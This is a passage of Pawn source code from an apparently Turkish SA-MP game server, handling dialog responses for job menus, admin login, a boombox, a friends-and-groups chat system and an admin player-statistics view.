		case DialogPilotEndLoc: Dialog_PilotSelectEndLoc(playerid, response, listitem); //

			//Mafia licenta
		case DialogMafiaJobMethod: Dialog_MafiaSelectJobMethod(playerid, response, listitem); //
		case DialogMafiaSelectLoad: Dialog_MafiaSelectLoad(playerid, response, listitem); //
		case DialogMafiaStartLoc: Dialog_MafiaSelectStartLoc(playerid, response, listitem); //
		case DialogMafiaEndLoc: Dialog_MafiaSelectEndLoc(playerid, response, listitem); //

		// Otobüsçü
		case DialogBusJobMethod: Dialog_BusJobMethod(playerid, listitem, response);
		case DialogBusDriverLoadLoc: Dialog_BusDriverLoadLoc(playerid, listitem, response);
		case DialogBusDriverUnloadLoc: Dialog_BusDriverUnloadLoc(playerid, listitem, response);

		// Dolmuþcu
		case DialogDolmusJobMethod: Dialog_DolmusJobMethod(playerid, response, listitem);
        case DialogDolmusSelectRoute: Dialog_DolmusSelectRoute(playerid, response, listitem); // Choose the busroute and start the job


		// Gemici
		case DialogGemiciJobMethod: Dialog_GemiciJobMethod(playerid, listitem, response);
		case DialogGemiciLoadLoc: Dialog_GemiciLoadLoc(playerid, listitem, response);
		case DialogGemiciUnloadLoc: Dialog_GemiciUnloadLoc(playerid, listitem, response);

		// Pboy
		case DialogPboySelectQuant: Dialog_PboySelectQuant(playerid, response, listitem);
	}

	// SPanel Sistemi
	// SPanel Sistemi
	SPanelDialogs2(playerid, dialogid, response, listitem, inputtext);
	
	SPanelDialogs(playerid, dialogid, response, listitem, inputtext);

	// Þirket Sistemi
	SirketDialogs(playerid, dialogid, response, listitem, inputtext);

	// Giþe Sistemi
	GiseDialogs(playerid, dialogid, response, inputtext);

	// TMMobile Sistemi
	TMMobileDialogs(playerid, dialogid, response, listitem, inputtext);
	/*ESKÝ SÝSTEM
	MP3ArsivDialogs(playerid, dialogid, response, listitem, inputtext);
	*/

	// Banka Sistemi
	BankaDialogs(playerid, dialogid, response, listitem, inputtext);

	// /houses Komutu
	HousesDialog(playerid, dialogid, response, listitem);

	// Puþt Tabela Sistemi
	PustTabelaDialogs(playerid, dialogid, response, listitem, inputtext);

	// Karakol Teleport

	if(dialogid == KARAKOL_SPAWN)
    {
        if(response) // If they clicked 'Select' or double-clicked a weapon
        {
            // Give them the weapon
            switch(listitem)
            {
                case 0:	SetPlayerPos(playerid,1542.4910,-1675.7490,13.5546);
                case 1: SetPlayerPos(playerid,-1605.9478,717.4630,12.0554);
                case 2: SetPlayerPos(playerid,2286.9290,2423.8462,10.8203);
            }
        }
        return 1;
    }

	// BoomBox Sistemi
	if(dialogid == DialogBoombox)
	{
	    if(response)
	    {
	        if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogBoombox, DIALOG_STYLE_INPUT, "{00FF00}BoomBox - Müzik Aç", "{F8F8FF}Açmak istediðiniz müziðin URL'sini giriniz:", "Aç", "Ýptal");
	        PlayASongInBoomBox(OyuncuBB[playerid], inputtext);
	        SendClientMessage(playerid, -1, "{00FF00}BoomBox'unuzda müzik açtýnýz.");
	    }
	}

	// Admin Sistemi Efso Sedo Korumasý ( Admin Giriþi )
	if(dialogid == 4747)
	{
	    if(response)
	    {
	        if(!strlen(inputtext)) return 1;
	        if(!strcmp(inputtext, APlayerData[playerid][PlayerAdmPassword], true))
	        {
				APlayerData[playerid][PlayerLevel] = APlayerData[playerid][PlayerFLevel];
				SendClientMessage(playerid, -1, "{80FFFF}Baþarýyla admin giriþi yaptýnýz.");
	        }else{
				SendClientMessage(playerid, -1, "{FF0000}Hatalý þifre girdin.");

	        }
	    }
	}

	
	
	// Metin ile delirmeceler
	if(dialogid == 9898)
	{
		if(response)
		{
			if(!strlen(inputtext)) return SendClientMessage(playerid, -1, "{FF0000}Boþ geçmeyelim efenim");
			SendClientMessageToAll(-1, inputtext);
		}
	}

	// Arkadaþlýk Sistemi
	if(dialogid == ARK_DIALOG)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            ShowPlayerDialog(playerid, ARK_DIALOG+4, DIALOG_STYLE_LIST, "Arkadaþ Ekle", "{FF0000}* {FFA500}ID'si ile ekle\n{FF0000}* {FFA500}Nick'i ile ekle", "Ileri >>", "<< Geri");
			}
			else if(listitem == 1)
			{
				GrupListGoster(playerid);
			}
			else
			{
			    SetPVarString(playerid, "tmp_aIsim", inputtext);
			    new baslik[48];
			    format(baslik, sizeof(baslik), "{40E0D0}%s", inputtext);
			    ShowPlayerDialog(playerid, ARK_DIALOG+15, DIALOG_STYLE_LIST, baslik, "{FFA500}Özel Mesaj Gönder\n{FFA500}Arkadaþlýktan Çýkar", "Seç", "<< Geri");
			}
		}
	}

	if(dialogid == ARK_DIALOG+1)
	{
	    if(response)
	    {
	        if(!isNumeric(inputtext)) return ShowPlayerDialog(playerid, ARK_DIALOG+1, DIALOG_STYLE_INPUT, "Arkadaþ Ekle", "{FF0000}HATA: {FFA500}Sadece rakam kullanýn!\n\n{71B1FF}Arkadaþ eklemek istediðiniz kiþinin ID'sini yazýnýz:", "Ekle", "<< Geri");
	        if(!IsPlayerConnected(strval(inputtext)) || strval(inputtext) == playerid) return ShowPlayerDialog(playerid, ARK_DIALOG+1, DIALOG_STYLE_INPUT, "Arkadaþ Ekle", "{FF0000}HATA: {FFA500}Oyuncu baðlý deðil veya sizsiniz!\n\n{71B1FF}Arkadaþ eklemek istediðiniz kiþinin ID'sini yazýnýz:", "Ekle", "<< Geri");
			SetPVarString(strval(inputtext), "istek_Atan", Isim(playerid));
			new i_str[100]; format(i_str, sizeof(i_str), "%s size arkadaþlýk isteði gönderdi.", Isim(playerid));
			ShowPlayerDialog(strval(inputtext), ARK_DIALOG+2, DIALOG_STYLE_MSGBOX, "Arkadaþlýk Ýsteði", i_str, "Kabul Et", "Reddet");
		}
		else ShowPlayerDialog(playerid, ARK_DIALOG+4, DIALOG_STYLE_LIST, "Arkadaþ Ekle", "{FF0000}* {FFA500}ID'si ile ekle\n{FF0000}* {FFA500}Nick'i ile ekle", "Ileri >>", "<< Geri");
	}

	if(dialogid == ARK_DIALOG+2)
	{
	    if(response)
	    {
	        new eklenecek[24];
	        GetPVarString(playerid, "istek_Atan", eklenecek, sizeof(eklenecek));
	        if(!IsPlayerConnected(GetPlayerIdFromName(eklenecek))) return SendClientMessage(playerid, -1, "Oyuncu oyunda deðil!");
	        ArkadasEkle(playerid, eklenecek);
	    }
	}

	if(dialogid == ARK_DIALOG+3)
	{
	    if(response)
	    {
	        if(!IsPlayerConnected(GetPlayerIdFromName(inputtext)) || GetPlayerIdFromName(inputtext) == playerid) return ShowPlayerDialog(playerid, ARK_DIALOG+3, DIALOG_STYLE_INPUT, "Arkadaþ Ekle", "{FF0000}HATA: {FFA500}Oyuncu baðlý deðil veya sizsiniz!\n\n{71B1FF}Arkadaþ eklemek istediðiniz kiþinin nickini yazýnýz:", "Ekle", "<< Geri");
			SetPVarString(GetPlayerIdFromName(inputtext), "istek_Atan", Isim(playerid));
			new i_str[100]; format(i_str, sizeof(i_str), "%s size arkadaþlýk isteði gönderdi.", Isim(playerid));
			ShowPlayerDialog(GetPlayerIdFromName(inputtext), ARK_DIALOG+2, DIALOG_STYLE_MSGBOX, "Arkadaþlýk Ýsteði", i_str, "Kabul Et", "Reddet");
			SendClientMessage(playerid, -1, "Arkadaþlýk isteði gönderildi!");
		} else ShowPlayerDialog(playerid, ARK_DIALOG+4, DIALOG_STYLE_LIST, "Arkadaþ Ekle", "{FF0000}* {FFA500}ID'si ile ekle\n{FF0000}* {FFA500}Nick'i ile ekle", "Ileri >>", "<< Geri");
	}

	if(dialogid == ARK_DIALOG+4)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            ShowPlayerDialog(playerid, ARK_DIALOG+1, DIALOG_STYLE_INPUT, "Arkadaþ Ekle", "{71B1FF}Arkadaþ eklemek istediðiniz kiþinin ID'sini yazýnýz:", "Ekle", "<< Geri");
	        }
	        else if(listitem == 1)
	        {
	            ShowPlayerDialog(playerid, ARK_DIALOG+3, DIALOG_STYLE_INPUT, "Arkadaþ Ekle", "{71B1FF}Arkadaþ eklemek istediðiniz kiþinin nickini yazýnýz:", "Ekle", "<< Geri");
	        }
	    } else KomutGoster(playerid);
	}

	if(dialogid == ARK_DIALOG+5)
	{
		if(response)
		{
		    if(listitem == 0)
		    {
				ShowPlayerDialog(playerid, ARK_DIALOG+9, DIALOG_STYLE_INPUT, "Grup Oluþtur", "{71B1FF}Gruba bir isim verin:", "Oluþtur", "<< Geri");
			}
			else
			{
				GrupGoster(playerid, inputtext);
			}
		} else KomutGoster(playerid);
	}

	if(dialogid == ARK_DIALOG+6)
	{
		if(response)
		{
		    if(listitem == 0)
		    {
			    SetPVarInt(playerid, "msj_gID", GetPVarInt(playerid, "tmp_gID"));
			    SendClientMessage(playerid, -1, "Grup seçildi!");
			}
			else if(listitem == 1)
			{
			    new str[512], grupid = GetPVarInt(playerid, "tmp_gID");
			    format(str, sizeof(str), "Kullanýcý Adý\tOnline Durumu\tStatü");
				for(new p; p<MAX_GRUP_KATILIMCI; p++)
				{
				    if(strlen(grupOyn[grupid][p]))
				    {
				        if(!xStrcmp(grupVeri[grupid][g_kurucu], grupOyn[grupid][p]))
				        {
							if(IsPlayerConnected(GetPlayerIdFromName(grupOyn[grupid][p]))) format(str, sizeof(str), "%s\n{FFFFFF}%s\t{00FF00}[Online]\t[Kurucu]", str, grupOyn[grupid][p]);
							else format(str, sizeof(str), "%s\n{FFFFFF}%s\t{FF0000}[Offline]\t[Kurucu]", str, grupOyn[grupid][p]);
						}
						else
						{
							if(IsPlayerConnected(GetPlayerIdFromName(grupOyn[grupid][p]))) format(str, sizeof(str), "%s\n{FFFFFF}%s\t{00FF00}[Online]\t[Üye]", str, grupOyn[grupid][p]);
							else format(str, sizeof(str), "%s\n{FFFFFF}%s\t{FF0000}[Offline]\t[Üye]", str, grupOyn[grupid][p]);
						}
					}
				}
				ShowPlayerDialog(playerid, ARK_DIALOG+10, DIALOG_STYLE_TABLIST_HEADERS, "Gruptaki Oyuncular", str, "Geri", "");
			}
			else if(!xStrcmp(inputtext, "Gruptan Çýk"))
			{
				ShowPlayerDialog(playerid, ARK_DIALOG+13, DIALOG_STYLE_MSGBOX, "Gruptan Çýk", "{71B1FF}Gruptan çýkmak istediðinize emin misiniz?", "Evet", "Iptal");
			}
			else if(!xStrcmp(inputtext, "Gruba Oyuncu Ekle"))
			{
			    if(xStrcmp(grupVeri[GetPVarInt(playerid, "tmp_gID")][g_kurucu], Isim(playerid))) return SendClientMessage(playerid, -1, "Bu grubun kurucusu deðilsiniz!");
			    ShowPlayerDialog(playerid, ARK_DIALOG+7, DIALOG_STYLE_INPUT, "Grup Ýsteði", "{71B1FF}Ýstek göndermek istediðiniz oyuncunun ID'sini girin:", "Gönder", "<< Geri");
			}
			else if(!xStrcmp(inputtext, "Gruptan Oyuncu Çýkar"))
			{
			    if(xStrcmp(grupVeri[GetPVarInt(playerid, "tmp_gID")][g_kurucu], Isim(playerid))) return SendClientMessage(playerid, -1, "Bu grubun kurucusu deðilsiniz!");
			    new str[512], grupid = GetPVarInt(playerid, "tmp_gID");
			    format(str, sizeof(str), "Kullanýcý Adý\tOnline Durumu");
				for(new p=1; p<MAX_GRUP_KATILIMCI; p++)
				{
				    if(strlen(grupOyn[grupid][p]))
				    {
						if(IsPlayerConnected(GetPlayerIdFromName(grupOyn[grupid][p]))) format(str, sizeof(str), "%s\n{FFFFFF}%s\t{00FF00}[Online]", str, grupOyn[grupid][p]);
						else format(str, sizeof(str), "%s\n{FFFFFF}%s\t{FF0000}[Offline]", str, grupOyn[grupid][p]);
					}
				}
				ShowPlayerDialog(playerid, ARK_DIALOG+11, DIALOG_STYLE_TABLIST_HEADERS, "Gruptan Çýkarýlacak Oyuncuyu Seçin", str, "Gruptan At", "<< Geri");

			}
			else if(!xStrcmp(inputtext, "Grubu Sil"))
			{
			    if(xStrcmp(grupVeri[GetPVarInt(playerid, "tmp_gID")][g_kurucu], Isim(playerid))) return SendClientMessage(playerid, -1, "Bu grubun kurucusu deðilsiniz!");
				ShowPlayerDialog(playerid, ARK_DIALOG+14, DIALOG_STYLE_MSGBOX, "Grubu Sil", "{71B1FF}Bu grubu silmek istediðinize emin misiniz?", "Evet", "Ýptal");
			}
		} else GrupListGoster(playerid);
	}

	if(dialogid == ARK_DIALOG+7)
	{
		if(response)
		{
		    if(!IsPlayerConnected(strval(inputtext)) || strval(inputtext) == playerid) return ShowPlayerDialog(playerid, ARK_DIALOG+7, DIALOG_STYLE_INPUT, "Grup Ýsteði", "{FF0000}HATA: {FFA500}Oyuncu baðlý deðil veya sizsiniz!\n\n{71B1FF}Ýstek göndermek istediðiniz oyuncunun ID'sini girin:", "Gönder", "Iptal");
            if(GrupCheck(strval(inputtext), GetPVarInt(playerid, "tmp_gID"))) return ShowPlayerDialog(playerid, ARK_DIALOG+7, DIALOG_STYLE_INPUT, "Grup Ýsteði", "{FF0000}HATA: {FFA500}Oyuncu zaten bu grupta var!\n\n{71B1FF}Ýstek göndermek istediðiniz oyuncunun ID'sini girin:", "Gönder", "Iptal");
			new i_str[128];
			format(i_str, sizeof(i_str), "* {FF0000}%s {B7BAFF}adlý kiþi sizi {00A1FF}%s {B7BAFF}adlý sohbet grubuna davet ediyor.", Isim(playerid), grupVeri[GetPVarInt(playerid, "tmp_gID")][g_isim]);
			ShowPlayerDialog(strval(inputtext), ARK_DIALOG+8, DIALOG_STYLE_MSGBOX, "Grup Ýsteði", i_str, "Katýl", "Reddet");
			SetPVarInt(strval(inputtext), "tmp_ist_gID", GetPVarInt(playerid, "tmp_gID"));
			new msg[128];
			format(msg, 128, "%s adlý kiþiye grup isteði gönderildi!", Isim(strval(inputtext)));
			SendClientMessage(playerid, -1, msg);
		} else GrupGoster(playerid, grupVeri[GetPVarInt(playerid, "tmp_gID")][g_isim]);
	}

	if(dialogid == ARK_DIALOG+8)
	{
	    if(response)
	    {
	        new g_id = GetPVarInt(playerid, "tmp_ist_gID");
	        if(GrupUyeSayisi(g_id) >= MAX_GRUP_KATILIMCI) return SendClientMessage(playerid, -1, "Bu grup maksimum sayýya ulaþtý. Artýk üye alamaz!");
	        if(grupVeri[g_id][g_Var] != 1) return SendClientMessage(playerid, -1, "Bu grup artýk mevcut deðil!");
			new msg[128];
			format(msg, 128, "%s adlý gruba katýldýnýz!", grupVeri[g_id][g_isim]);
			SendClientMessage(playerid, -1, msg);
			format(msg, 128, "* {FF0000}[%s] {00FF00}%s {FFA500}adlý kiþi gruba katýldý!", grupVeri[g_id][g_isim], Isim(playerid));
			GrubaSendClientMessage(g_id, msg);
			GetPlayerName(playerid, grupOyn[g_id][GrupBosSlotIDVer(g_id)], 24);
			for(new g; g<MAX_GRUP; g++) if(grupVeri[g][g_Var] == 1) grupKayit(g);
			GrupListGoster(playerid);
	    }
	    else
	    {
	        new g_id = GetPVarInt(playerid, "tmp_ist_gID");
			new msg[128];
			format(msg, 128, "%s adlý gruba katýlmayý reddettiniz!", grupVeri[g_id][g_isim]);
			SendClientMessage(playerid, -1, msg);
			if(IsPlayerConnected(GetPlayerIdFromName(grupVeri[g_id][g_kurucu])))
			{
				format(msg, 128, "%s adlý kiþi grubunuza katýlmayý reddetti!", Isim(playerid));
				SendClientMessage(GetPlayerIdFromName(grupVeri[g_id][g_kurucu]), -1, msg);
			}
	    }
	}

	if(dialogid == ARK_DIALOG+9)
	{
	    if(response)
	    {
	        if(strlen(inputtext) < 3) return ShowPlayerDialog(playerid, ARK_DIALOG+9, DIALOG_STYLE_INPUT, "Grup Oluþtur", "{FF0000}HATA: {FFA500}En az 3 karakter girin!\n\n{71B1FF}Gruba bir isim verin:", "Oluþtur", "<< Geri");
	        if(strlen(inputtext) > 24) return ShowPlayerDialog(playerid, ARK_DIALOG+9, DIALOG_STYLE_INPUT, "Grup Oluþtur", "{FF0000}HATA: {FFA500}En fazla 24 karakter girebilirsiniz!\n\n{71B1FF}Gruba bir isim verin:", "Oluþtur", "<< Geri");
            if(!IsValidName(inputtext)) return ShowPlayerDialog(playerid, ARK_DIALOG+9, DIALOG_STYLE_INPUT, "Grup Oluþtur", "{FF0000}HATA: {FFA500}Özel karakter kullanmayýn!\n\n{71B1FF}Gruba bir isim verin:", "Oluþtur", "<< Geri");
			for(new ai; ai<MAX_GRUP; ai++) if(grupVeri[ai][g_Var] == 1 && !xStrcmp(grupVeri[ai][g_isim], inputtext)) return ShowPlayerDialog(playerid, ARK_DIALOG+9, DIALOG_STYLE_INPUT, "Grup Oluþtur", "{FF0000}HATA: {FFA500}Bu isimde zaten bir grup var!\n\n{71B1FF}Gruba bir isim verin:", "Oluþtur", "<< Geri");
   			new g_id = BosGrupIDVer();
			if(g_id == -1) return SendClientMessage(playerid, -1, "Maksimum grup sayýsýna ulaþýlmýþ. Artýk grup oluþturamazsýnýz!");
			grupVeri[g_id][g_Var] = 1;
			GetPlayerName(playerid, grupVeri[g_id][g_kurucu], 24);
			format(grupVeri[g_id][g_isim], 24, "%s", inputtext);
			GetPlayerName(playerid, grupOyn[g_id][0], 24);
			SendClientMessage(playerid, -1, "Grup baþarýyla oluþturuldu!");
			for(new g; g<MAX_GRUP; g++) if(grupVeri[g][g_Var] == 1) grupKayit(g);
			GrupListGoster(playerid);
	    } else GrupListGoster(playerid);
	}

	if(dialogid == ARK_DIALOG+10)
	{
		if(response || !response) GrupGoster(playerid, grupVeri[GetPVarInt(playerid, "tmp_gID")][g_isim]);
	}

	if(dialogid == ARK_DIALOG+11)
	{
		if(response)
		{
		    if(!strlen(inputtext)) return SendClientMessage(playerid, -1, "Oyuncu seçmediniz!"), GrupGoster(playerid, grupVeri[GetPVarInt(playerid, "tmp_gID")][g_isim]);
		    new str[88];
		    format(str, sizeof(str), "* {FF0000}%s {B7BBBA}adlý kiþiyi gruptan çýkarmak istediðinize emin misiniz?", inputtext);
			SetPVarString(playerid, "tmp_aIsim", inputtext);
			ShowPlayerDialog(playerid, ARK_DIALOG+12, DIALOG_STYLE_MSGBOX, "Gruptan Çýkar", str, "Evet", "Ýptal");
		} else GrupGoster(playerid, grupVeri[GetPVarInt(playerid, "tmp_gID")][g_isim]);
	}

	if(dialogid == ARK_DIALOG+12)
	{
	    if(response)
	    {
			new a_isim[24];
			GetPVarString(playerid, "tmp_aIsim", a_isim, 24);
		    for(new p; p<MAX_GRUP_KATILIMCI; p++) if(!xStrcmp(grupOyn[GetPVarInt(playerid, "tmp_gID")][p], a_isim)) format(grupOyn[GetPVarInt(playerid, "tmp_gID")][p], 24, "");
            for(new g; g<MAX_GRUP; g++) if(grupVeri[g][g_Var] == 1) grupKayit(g);
			SendClientMessage(playerid, -1, "Oyuncu gruptan çýkarýldý!");
			if(IsPlayerConnected(GetPlayerIdFromName(a_isim)))
			{
				new str[88];
		        format(str, sizeof(str), "{FF0000}%s {FFA500}adlý gruptan çýkarýldýnýz.", grupVeri[GetPVarInt(playerid, "tmp_gID")][g_isim]);
				SendClientMessage(GetPlayerIdFromName(a_isim), -1, str);
				if(GetPVarInt(GetPlayerIdFromName(a_isim), "msj_gID") == GetPVarInt(playerid, "tmp_gID")) SetPVarInt(GetPlayerIdFromName(a_isim), "msj_gID", -1);
			}
		} else GrupGoster(playerid, grupVeri[GetPVarInt(playerid, "tmp_gID")][g_isim]);
	}

	if(dialogid == ARK_DIALOG+13)
	{
	    if(response)
	    {
	        new str[88];
	        format(str, sizeof(str), "{FF0000}%s {FFA500}adlý gruptan ayrýldýnýz.", grupVeri[GetPVarInt(playerid, "tmp_gID")][g_isim]);
		    for(new p; p<MAX_GRUP_KATILIMCI; p++) if(!xStrcmp(grupOyn[GetPVarInt(playerid, "tmp_gID")][p], Isim(playerid))) format(grupOyn[GetPVarInt(playerid, "tmp_gID")][p], 24, "");
            for(new g; g<MAX_GRUP; g++) if(grupVeri[g][g_Var] == 1) grupKayit(g);
			if(GetPVarInt(playerid, "msj_gID") == GetPVarInt(playerid, "tmp_gID")) SetPVarInt(playerid, "msj_gID", -1);
			SendClientMessage(playerid, -1, str);
		} else GrupGoster(playerid, grupVeri[GetPVarInt(playerid, "tmp_gID")][g_isim]);
	}

	if(dialogid == ARK_DIALOG+14)
	{
		if(response)
		{
		    new g_msj[88];
			format(g_msj, sizeof(g_msj), ">> [GRUP] {FF0000}[%s] {FFA500}Grup silindi!", grupVeri[GetPVarInt(playerid, "tmp_gID")][g_isim]);
		    GrubaSendClientMessage(GetPVarInt(playerid, "tmp_gID"), g_msj);
            for(new p; p<MAX_GRUP_KATILIMCI; p++)
            {
                if(GetPVarInt(GetPlayerIdFromName(grupOyn[GetPVarInt(playerid, "tmp_gID")][p]), "msj_gID") == GetPVarInt(playerid, "tmp_gID")) SetPVarInt(GetPlayerIdFromName(grupOyn[GetPVarInt(playerid, "tmp_gID")][p]), "msj_gID", -1);
                format(grupOyn[GetPVarInt(playerid, "tmp_gID")][p], 24, "");
            }
            grupVeri[GetPVarInt(playerid, "tmp_gID")][g_Var] = 0;
            new g_dosya[64];
            format(g_dosya, sizeof(g_dosya), "xFriendship/Gruplar/%d.ini", GetPVarInt(playerid, "tmp_gID"));
            SINI_Remove(g_dosya);
		} else GrupGoster(playerid, grupVeri[GetPVarInt(playerid, "tmp_gID")][g_isim]);
	}

	if(dialogid == ARK_DIALOG+15)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
				new p_is[24];
				GetPVarString(playerid, "tmp_aIsim", p_is, 24);
				if(!IsPlayerConnected(GetPlayerIdFromName(p_is)))
				{
					SendClientMessage(playerid, -1, "Bu oyuncu baðlý deðil!");
				    new baslik[48];
				    format(baslik, sizeof(baslik), "{40E0D0}%s", p_is);
				    ShowPlayerDialog(playerid, ARK_DIALOG+15, DIALOG_STYLE_LIST, baslik, "{FFA500}Özel Mesaj Gönder\n{FFA500}Arkadaþlýktan Çýkar", "Seç", "<< Geri");
					return 1;
				}
				ShowPlayerDialog(playerid, ARK_DIALOG+16, DIALOG_STYLE_INPUT, "Mesaj Gönder", "Göndermek istediðiniz mesajý yazýn:", "Gönder", "<< Geri");
			}
			else if(listitem == 1)
			{
			    new str[124], p_is[24];
				GetPVarString(playerid, "tmp_aIsim", p_is, 24);
			    format(str, sizeof(str), "{FF0000}%s {FFA500}adlý kiþiyi arkadaþlýktan çýkarmak istediðinize emin misiniz?", p_is);
			    ShowPlayerDialog(playerid, ARK_DIALOG+17, DIALOG_STYLE_MSGBOX, "Arkadaþ Çýkar", str, "Evet", "Iptal");
			}
		} else KomutGoster(playerid);
	}

	if(dialogid == ARK_DIALOG+16)
	{
	    if(response)
	    {
			new p_is[24], o_msj[256];
			GetPVarString(playerid, "tmp_aIsim", p_is, 24);
			if(!IsPlayerConnected(GetPlayerIdFromName(p_is))) return SendClientMessage(playerid, -1, "Bu oyuncu baðlý deðil!");
			format(o_msj, sizeof(o_msj), ">> [ÖZEL MESAJ] {00A1FF}[%s]{FFFFFF}: %s", Isim(playerid), inputtext);
			SendClientMessage(GetPlayerIdFromName(p_is), 0xFFE500AA, o_msj);
			format(o_msj, sizeof(o_msj), ">> [GÝDEN MESAJ] {00A1FF}[%s]{FFFFFF}: %s", p_is, inputtext);
			SendClientMessage(playerid, 0xFFA500AA, o_msj);
	    }
		else
		{
			new p_is[24], baslik[48];
			GetPVarString(playerid, "tmp_aIsim", p_is, 24);
			format(baslik, sizeof(baslik), "{40E0D0}%s", p_is);
			ShowPlayerDialog(playerid, ARK_DIALOG+15, DIALOG_STYLE_LIST, baslik, "{FFA500}Özel Mesaj Gönder\n{FFA500}Arkadaþlýktan Çýkar", "Seç", "<< Geri");
		}
	}

	if(dialogid == ARK_DIALOG+17)
	{
		if(response)
		{
 			new p_is[24], mstr[88];
			GetPVarString(playerid, "tmp_aIsim", p_is, 24);
		    for(new ai; ai<MAX_ARKADAS; ai++)
		    {
				if(!xStrcmp(arkList[playerid][ai], p_is)) format(arkList[playerid][ai], 24, "");
			}
			format(mstr, sizeof(mstr), "{FF0000}%s {FFA500}adlý kiþiyi arkadaþlýktan çýkardýnýz!", p_is);
			SendClientMessage(playerid, -1, mstr);
			if(IsPlayerConnected(GetPlayerIdFromName(p_is)))
			{
			    for(new as; as<MAX_ARKADAS; as++)
			    {
					if(!xStrcmp(arkList[GetPlayerIdFromName(p_is)][as], Isim(playerid))) format(arkList[GetPlayerIdFromName(p_is)][as], 24, "");
				}
				format(mstr, sizeof(mstr), "{FF0000}%s {FFA500}adlý kiþi sizi arkadaþlýktan çýkardý!", Isim(playerid));
				SendClientMessage(GetPlayerIdFromName(p_is), -1, mstr);
			}
		}
		else
		{
			new p_is[24], baslik[48];
			GetPVarString(playerid, "tmp_aIsim", p_is, 24);
			format(baslik, sizeof(baslik), "{40E0D0}%s", p_is);
			ShowPlayerDialog(playerid, ARK_DIALOG+15, DIALOG_STYLE_LIST, baslik, "{FFA500}Özel Mesaj Gönder\n{FFA500}Arkadaþlýktan Çýkar", "Seç", "<< Geri");
		}
	}

	// Malikane
	/*if(dialogid == DialogOynakDisKapi)
	{
	    if(response)
	    {
	        if(!strlen(inputtext)) return 1;
			if(!strcmp(SEDO_KAPI_PASS, inputtext, true))
			{
			    switch(OynakDisKapi[playerid])
				{
			        case 1:
			        {
 						GetDynamicObjectPos(SedoDisKapi[0], objX, objY, objZ);
						GetDynamicObjectRot(SedoDisKapi[0], objRX, objRY, objRZ);
						if(objZ == 9.467059) MoveDynamicObject(SedoDisKapi[0], objX, objY, objZ-10.0, 2.0, objRX, objRY, objRZ);
						if(objZ == (9.467059-10.0)) MoveDynamicObject(SedoDisKapi[0], objX, objY, objZ+10.0, 2.0, objRX, objRY, objRZ);
			        }

			        case 2:
			        {
 						GetDynamicObjectPos(SedoDisKapi[1], objX, objY, objZ);
						GetDynamicObjectRot(SedoDisKapi[1], objRX, objRY, objRZ);
						if(objZ == 9.467059) MoveDynamicObject(SedoDisKapi[1], objX, objY, objZ-10.0, 2.0, objRX, objRY, objRZ);
						if(objZ == (9.467059-10.0)) MoveDynamicObject(SedoDisKapi[1], objX, objY, objZ+10.0, 2.0, objRX, objRY, objRZ);
			        }
			    }
			}
	    }
    }*/

    return 1;
}

// this callback gets called when a player clicks on another player on the scoreboard
public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	// Check if the player is an admin of at least level 1
	if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1)
	{
		// Setup local variables
		new Name[24], DialogTitle[128], PlayerStatList[3000], PlayerIP[16], NumHouses, NumBusinesses;

		// Construct the dialog-title
		GetPlayerName(clickedplayerid, Name, sizeof(Name));
		format(DialogTitle, 128, "Statistics of player: %s", Name);

		// Add the IP of the player to the list
	    GetPlayerIp(clickedplayerid, PlayerIP, sizeof(PlayerIP));
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Player-IP: {00FF00}%s\n", PlayerStatList, PlayerIP);
		// Add the level of the player to the list
		format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Admin-level: {00FF00}%i\n", PlayerStatList, APlayerData[clickedplayerid][PlayerLevel]);

	    format(PlayerStatList, sizeof(PlayerStatList), "%sKayýt Tarihi: {00FF00}%d/%d/%d{FFFFFF}\n", PlayerStatList, pInfo[clickedplayerid][pKGun], pInfo[clickedplayerid][pKAy], pInfo[clickedplayerid][pKYil]);
	    format(PlayerStatList, sizeof(PlayerStatList), "%sÖnceki Giriþi: {00FF00}%d/%d/%d{FFFFFF}\n", PlayerStatList, pInfo[clickedplayerid][pSGun], pInfo[clickedplayerid][pSAy], pInfo[clickedplayerid][pSYil]);
	    format(PlayerStatList, sizeof(PlayerStatList), "%sOnline Süresi: {00FF00}%d Gün %d Saat %d Dakika %d Saniye{FFFFFF}\n", PlayerStatList, pInfo[clickedplayerid][pOGun], pInfo[clickedplayerid][pOSaat], pInfo[clickedplayerid][pODakika], pInfo[clickedplayerid][pOSaniye]);

		switch(APlayerData[playerid][PlayerClass])
		{
 			case ClassTruckDriver: format(PlayerStatList, sizeof(PlayerStatList), "%sRank: {00FF00}%s{FFFFFF}\n", PlayerStatList, TruckerRanks[ Rank[clickedplayerid] ][RankName]);
   			case ClassBusDriver: format(PlayerStatList, sizeof(PlayerStatList), "%sRank: {00FF00}%s{FFFFFF}\n", PlayerStatList, BusDriverRanks[ Rank[clickedplayerid] ][RankName]);
	    	case ClassDolmusDriver: format(PlayerStatList, sizeof(PlayerStatList), "%sRank: {00FF00}%s{FFFFFF}\n", PlayerStatList, DolmusDriverRanks[ Rank[clickedplayerid] ][RankName]);
	    	case ClassPilot: format(PlayerStatList, sizeof(PlayerStatList), "%sRank: {00FF00}%s{FFFFFF}\n", PlayerStatList, PilotRanks[ Rank[clickedplayerid] ][RankName]);
	    	case ClassPolice: format(PlayerStatList, sizeof(PlayerStatList), "%sRank: {00FF00}%s{FFFFFF}\n", PlayerStatList, PoliceRanks[ Rank[clickedplayerid] ][RankName]);
	    	case ClassMafia: format(PlayerStatList, sizeof(PlayerStatList), "%sRank: {00FF00}%s{FFFFFF}\n", PlayerStatList, MafiaRanks[ Rank[clickedplayerid] ][RankName]);
	    	case ClassRoadWorker: format(PlayerStatList, sizeof(PlayerStatList), "%sRank: {00FF00}%s{FFFFFF}\n", PlayerStatList, RoadWorkerRanks[ Rank[clickedplayerid] ][RankName]);
	    	case ClassPboy: format(PlayerStatList, sizeof(PlayerStatList), "%sRank: {00FF00}%s{FFFFFF}\n", PlayerStatList, PboyRanks[ Rank[clickedplayerid] ][RankName]);
		}

		// Add the class of the player to the list
		switch(APlayerData[clickedplayerid][PlayerClass])
		{
			case ClassTruckDriver: format(PlayerStatList, sizeof(PlayerStatList), "%s{FFFFFF}Class: {00FF00}Trucker\n", PlayerStatList);
